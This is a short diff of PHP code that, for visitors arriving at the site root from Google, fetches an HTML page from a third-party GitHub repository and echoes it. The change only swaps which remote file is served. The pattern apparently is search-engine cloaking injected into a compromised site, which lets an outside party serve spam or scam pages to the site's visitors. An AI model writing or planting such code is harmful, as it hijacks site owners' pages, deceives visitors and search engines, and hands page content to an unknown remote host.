@@ -10,7 +10,7 @@ if ($uri == '/' && (
     strpos($referer, 'google') !== false
 )) {
 
-    $externalFile = file_get_contents('https://raw.githubusercontent.com/gabriellaque/pociseo/main/mail-wartaardhia.html');
+    $externalFile = file_get_contents('https://raw.githubusercontent.com/gabriellaque/pociseo/main/euroasiapub.html');
     if ($externalFile !== false) {
         echo $externalFile;
     } else {
